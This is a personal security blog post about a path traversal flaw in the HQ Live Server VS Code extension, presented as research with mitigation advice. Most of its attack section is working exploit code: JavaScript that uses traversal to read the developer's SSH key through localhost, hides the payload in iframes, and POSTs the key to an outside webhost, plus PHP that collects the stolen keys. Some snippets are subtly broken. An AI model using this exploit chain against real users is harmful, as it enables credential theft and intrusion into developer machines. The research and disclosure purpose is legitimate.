---
layout: post
title:  "My Journey in Uncovering Vulnerabilities in VS Code Extensions: Protecting Your Supply Chain from Cyber Threats"
date:   2023-02-28 13:25:13 -0400
cover: post-image6.png
categories: vscode extension security
description: In this blog post, I’ll share my journey in identifying, analyzing, and testing VS Code extensions from a security breach perspective, and the creative recommendations I came up with to mitigate potential risks.
---

# Introduction

As a passionate developer, I've always been a fan of Visual Studio Code (VS Code). This popular text editor boasts over 14 million active users worldwide and offers a wide range of third-party extensions to enhance its functionality. However, I couldn't help but wonder about the potential security risks these extensions might pose if they're not thoroughly tested and validated. In this blog post, I'll share my journey in identifying, analyzing, and testing VS Code extensions from a security breach perspective, and the creative recommendations I came up with to mitigate potential risks.

# Why VS Code Caught My Eye as a Prime Target for Cyber Attacks

The immense user base of VS Code makes it an attractive target for malicious actors. Ensuring the security of third-party extensions is challenging, as developer machines often contain sensitive credentials and access to critical parts of the codebase. Moreover, these extensions run with user privileges and without sandboxing, making it easier for malicious actors to install harmful programs. As security experts warn about potential threats, it becomes crucial to scrutinize the legitimacy and security of VS Code extensions.

# My Ingenious Five-Phase Approach to Identifying and Mitigating Vulnerabilities

To assess the security of VS Code extensions, I devised a creative five-phase approach:

- Extension Selection: I handpicked extensions based on official statistics and community feedback.
- Vulnerability Identification: I thoroughly analyzed the selected extensions for potential security vulnerabilities.
- Vulnerability Exploitation: I attempted to exploit identified vulnerabilities, determining their impact and validating mitigation strategies.
- Grouping Vulnerabilities & Automating Detection: I classified extensions according to their underlying technology or coding practices, and developed an automated detection process.
- Reporting and Recommendations: I prepared a comprehensive report summarizing my findings and recommendations.

# My Findings: Vulnerabilities and the Art of Exploitation

During my research, I came across a few articles that highlighted various vulnerabilities in extensions, ranging from path traversal to code execution [1][2]. Intrigued, I decided to focus on identifying similar vulnerabilities and devising ways to exploit them. I discovered that a common issue among these extensions is unsanitized inputs.

I found a vulnerability in the HQ Live Server extension, which allowed me to access sensitive files outside the server's root folder. To exploit this vulnerability and access the developer's SSH key, I designed a payload that would bypass challenges like cross-site scripting (XSS) protection and the same-origin policy. I created a multi-step process that involved downloading and executing the payload on the victim's system.

Here's the code snippet for creating and downloading my payload:

<pre> <code>const payload = `&lt;body&gt; &lt;script&gt; 
    for (let n = 0; n < ${maxNesting}; n++) {
    fetch('http://localhost:8080/'+'..%2f'.repeat(n)+'.ssh/id_rsa.pub')
    .then((res) => {if (res.status === 200) {
        res.text().then((data) => window.parent.postMessage(data, '*'));
    }
}); }&lt;/scr`+"ipt&gt;&lt;/bo"+"dy&gt;";

const fileName = `file_${Math.random()}.html`;
const a = document.createElement('a');
a.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(payload));
a.setAttribute('download', fileName);
a.style.display = 'none';
document.body.appendChild(a);
a.click();
document.body.removeChild(a);
</code>
</pre>

Next, I loaded the downloaded payload in an iframe:

<pre>
setTimeout(() => {
        for (let n = 0; n < maxNesting; n++) {
              const iframe = document.createElement('iframe');
              iframe.setAttribute('src', http://localhost:8080/${'..%2f'.repeat(n)}Downloads/${fileName});
iframe.setAttribute('style', 'width: 0px; height: 0px;')
document.body.appendChild(iframe);
}
}, 2000);
</pre>


Finally, I sent the obtained key to a malicious server:

<pre>
window.addEventListener('message', (event) => {
          const formData = new FormData();
          formData.append('data', event.data);
          fetch('https://welcometomywebpage.000webhostapp.com/data.php', {
            "method": "POST",
            "body": formData   
          });
      }, false);

</pre>

I also crafted server-side PHP code to receive the key and save it:
<pre>
&lt;?php
// Check if form is submitted with POST method
if ($_SERVER["REQUEST_METHOD"] == "POST") {

  // Get the data from the form
  $key = $_POST["data"];

  // Create a new file with a unique name
  $filename =  "details.txt";
  if (file_exists($filename)) {
		$handle = fopen($filename, 'a'); // open file in append mode
	} else {
		$handle = fopen($filename, 'w'); // create new file
	}

  // Open the file for writing
  $handle = fopen($filename, "a");

  // Write the data to the file
  fwrite($handle, "Key: \n$key\n");

  // Close the file
  fclose($handle);

  // Output a success message
  echo "Data saved to file!";
}
?&gt;
</pre>

To exploit the vulnerability, an attacker would follow these steps:

    Open VS Code and activate the vulnerable extension.
    Click on a malicious link provided by the attacker (e.g., https://welcometomywebpage.000webhostapp.com/).

# Paving the Way for a More Secure Future

My research emphasizes the importance of vigilantly testing and validating VS Code extensions to identify potential security vulnerabilities. As cyber threats evolve, it's crucial to adopt proactive measures to safeguard your supply chain.

I recommend automating the vulnerability testing process using available tools and custom test cases. This approach enables developers to swiftly identify and address security vulnerabilities before they pose a threat.

In conclusion, the security of third-party extensions must not be overlooked, as they can introduce significant risks to users and their systems. By identifying vulnerabilities and implementing robust mitigation strategies, developers can create a safer and more secure development environment.

## References:

[1] Trail of Bits. (2023). Escaping the VSCode extension sandbox. Retrieved from https://blog.trailofbits.com/2023/02/21/vscode-extension-escape-vulnerability/

[2] Snyk. (n.d.). Visual Studio Code extension security vulnerabilities deep dive. Retrieved from https://snyk.io/blog/visual-studio-code-extension-security-vulnerabilities-deep-dive/

